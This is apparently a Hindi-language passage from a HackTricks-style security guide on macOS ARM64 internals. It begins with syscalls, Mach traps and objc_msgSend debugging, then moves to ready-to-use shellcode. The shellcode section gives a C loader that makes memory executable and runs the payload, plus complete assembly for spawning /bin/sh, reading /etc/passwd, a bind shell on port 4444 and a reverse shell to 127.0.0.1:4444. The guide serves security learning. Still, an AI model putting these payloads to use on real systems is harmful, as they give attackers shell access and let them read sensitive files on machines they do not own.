[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) देखें या `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` चलाएं। BSD syscalls में **x16 > 0** होगा।

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) में `mach_trap_table` और [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) में prototypes देखें। Mach traps की maximum संख्या `MACH_TRAP_TABLE_COUNT` = 128 है। Mach traps में **x16 < 0** होगा, इसलिए आपको previous list में दिए गए numbers को **minus** के साथ call करना होगा: **`_kernelrpc_mach_vm_allocate_trap`** का मान **`-10`** है।

आप इन (और BSD) syscalls को call करने का तरीका जानने के लिए disassembler में **`libsystem_kernel.dylib`** भी check कर सकते हैं:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
ध्यान दें कि **Ida** और **Ghidra** केवल cache पास करके cache से **specific dylibs** को भी decompile कर सकते हैं।

> [!TIP]
> कभी-कभी **source code** को check करने की तुलना में **`libsystem_kernel.dylib`** से **decompiled** code check करना आसान होता है, क्योंकि कई syscalls (BSD और Mach) का code scripts के ज़रिए generate होता है (source code में comments check करें), जबकि dylib में आप देख सकते हैं कि क्या call किया जा रहा है।

### machdep calls

XNU एक अन्य प्रकार के calls को support करता है जिन्हें machine dependent कहा जाता है। इन calls के numbers architecture पर निर्भर करते हैं और calls या numbers के constant बने रहने की कोई guarantee नहीं है।

### comm page

यह kernel के स्वामित्व वाला memory page है, जो हर users process के address space में mapped होता है। इसका उद्देश्य user mode से kernel space में transition को syscalls का उपयोग करने की तुलना में तेज़ बनाना है, उन kernel services के लिए जिनका इतना अधिक उपयोग होता है कि यह transition बहुत inefficient हो जाता।

उदाहरण के लिए, `gettimeofdate` call `timeval` की value को सीधे comm page से read करता है।

### objc_msgSend

Objective-C या Swift programs में इस function का उपयोग मिलना बहुत common है। यह function Objective-C object की method को call करने की अनुमति देता है।

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> instance का Pointer
- x1: op -> method का Selector
- x2... -> invoked method के बाकी arguments

इसलिए, यदि आप इस function पर branch से पहले breakpoint लगाते हैं, तो आप lldb में आसानी से पता लगा सकते हैं कि क्या invoke किया जा रहा है (इस example में object `NSConcreteTask` के एक object को call करता है, जो एक command run करेगा):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> env variable **`NSObjCMessageLoggingEnabled=1`** सेट करने पर, इस function को कब call किया जाता है, इसे `/tmp/msgSends-pid` जैसी file में log करना संभव है।
>
> इसके अलावा, **`OBJC_HELP=1`** सेट करके किसी भी binary को call करने पर आप अन्य environment variables देख सकते हैं, जिनका उपयोग कुछ Objc-C actions होने पर **log** करने के लिए किया जा सकता है।

जब इस function को call किया जाता है, तो दिए गए instance की called method को ढूंढना आवश्यक होता है। इसके लिए कई searches की जाती हैं:

- Optimistic cache lookup करें:
- यदि सफल हो, तो पूरा हुआ
- runtimeLock (read) प्राप्त करें
- यदि (realize && !cls->realized) हो, तो class को realize करें
- यदि (initialize && !cls->initialized) हो, तो class को initialize करें
- Class के अपने cache को आज़माएं:
- यदि सफल हो, तो पूरा हुआ
- Class की method list को आज़माएं:
- यदि मिल जाए, तो cache भरें और पूरा हुआ
- Superclass के cache को आज़माएं:
- यदि सफल हो, तो पूरा हुआ
- Superclass की method list को आज़माएं:
- यदि मिल जाए, तो cache भरें और पूरा हुआ
- यदि (resolver) हो, तो method resolver आज़माएं और class lookup से दोबारा शुरू करें
- यदि अभी भी यहां हैं (= बाकी सभी प्रयास विफल हो चुके हैं), तो forwarder आज़माएं

### Shellcodes

Compile करने के लिए:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
bytes निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
नए macOS के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>shellcode को test करने के लिए C code</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**यहाँ से**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) लिया गया है और समझाया गया है।<sup>[1]</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat से पढ़ना

लक्ष्य `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को execute करना है, इसलिए दूसरा argument (x1) params का एक array है (जो memory में addresses के stack को दर्शाता है)।
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### main process को kill होने से बचाने के लिए fork से sh के साथ command चलाएँ
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) से Bind shell **port 4444**<sup>[2]</sup> में.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s) से **127.0.0.1:4444** पर revshell<sup>[3]</sup>।
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## संदर्भ

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
